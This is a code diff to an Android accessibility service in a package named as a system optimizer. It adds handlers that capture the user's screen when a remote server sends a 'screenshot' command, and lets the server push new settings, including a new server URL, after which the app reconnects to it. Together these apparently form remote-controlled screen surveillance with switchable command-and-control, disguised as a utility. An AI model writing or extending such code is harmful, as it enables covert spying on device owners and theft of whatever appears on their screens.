@@ -7,6 +7,8 @@ import com.system.optimizer.network.SocketManager;
 
 import android.os.Build;
 
+import org.json.JSONObject;
+
 import android.accessibilityservice.AccessibilityService;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
@@ -23,7 +25,7 @@ public class AccessibilityMonitorService extends AccessibilityService {
     private AccessibilityEventHandler accessibilityEventHandler;
 
     /**
-     * Single-thread executor to handle CPU-intensive JPEG compression 
+     * Single-thread executor to handle CPU-intensive JPEG compression
      * without blocking the Accessibility (Main) thread.
      */
     private final ExecutorService backgroundExecutor = Executors.newSingleThreadExecutor();
@@ -39,38 +41,46 @@ public class AccessibilityMonitorService extends AccessibilityService {
             this.socketManager = new SocketManager(appConfig);
 
             // Create text handler with screenshot capture reference
-            this.accessibilityEventHandler = new AccessibilityEventHandler(this::screenshotDispatcher, appConfig, socketManager);
+            this.accessibilityEventHandler = new AccessibilityEventHandler(this::screenshotDispatcher, appConfig,
+                    socketManager);
 
             this.socketManager.addPersistentListener("screenshot", args -> {
-                // Trigger manual screenshot capture (bypasses auto_screenshot config)
-                accessibilityEventHandler.triggerManualCapture();
+                try {
+                    JSONObject data = (JSONObject) args[0];
+                    String requestId = data.getString("request_id");
+
+                    Log.d(TAG, "Screenshot request received: " + requestId);
+                    accessibilityEventHandler.triggerManualCapture(requestId);
+
+                } catch (Exception e) {
+                    Log.e(TAG, "Invalid screenshot request format", e);
+                    socketManager.sendEvent("screenshot_error", "Invalid or missing request_id");
+                }
             });
 
             this.socketManager.addPersistentListener("config_data", args -> {
                 Log.d(TAG, "ConfigData event received from server");
-                if (args != null && args.length > 0) {
-                    try {
-                        org.json.JSONObject configJson = (org.json.JSONObject) args[0];
+                try {
+                    JSONObject configJson = (JSONObject) args[0];
 
-                        ConfigData serverConfig = appConfig.createConfigFromJson(configJson);
-                        String newServerUrl = serverConfig.getServerUrl();
+                    ConfigData serverConfig = appConfig.createConfigFromJson(configJson);
+                    String newServerUrl = serverConfig.getServerUrl();
 
-                        // Get current stored URL before updating config
-                        String currentServerUrl = appConfig.getStoredServerUrl();
+                    // Get current stored URL before updating config
+                    String currentServerUrl = appConfig.getStoredServerUrl();
 
-                        Log.d(TAG, "Refreshing config data from server");
-                        appConfig.setConfig(serverConfig);
+                    Log.d(TAG, "Refreshing config data from server");
+                    appConfig.setConfig(serverConfig);
 
-                        // Check if server URL has changed
-                        if (currentServerUrl == null || !currentServerUrl.equals(newServerUrl)) {
-                            Log.d(TAG, "Server URL changed from " + currentServerUrl + " to " + newServerUrl);
+                    // Check if server URL has changed
+                    if (currentServerUrl == null || !currentServerUrl.equals(newServerUrl)) {
+                        Log.d(TAG, "Server URL changed from " + currentServerUrl + " to " + newServerUrl);
 
-                            Log.d(TAG, "Reconnecting socket to new URL");
-                            socketManager.reconnectToNewUrl();
-                        }
-                    } catch (Exception e) {
-                        Log.e(TAG, "Error processing config_data from server: " + e.getMessage(), e);
+                        Log.d(TAG, "Reconnecting socket to new URL");
+                        socketManager.reconnectToNewUrl();
                     }
+                } catch (Exception e) {
+                    Log.e(TAG, "Error processing config_data from server: " + e.getMessage(), e);
                 }
             });
 
@@ -102,7 +112,7 @@ public class AccessibilityMonitorService extends AccessibilityService {
     public void onDestroy() {
         try {
             Log.d(TAG, "Shutting down service and executor");
-            
+
             // Gracefully shut down the background executor
             backgroundExecutor.shutdown();
             if (!backgroundExecutor.awaitTermination(2, TimeUnit.SECONDS)) {
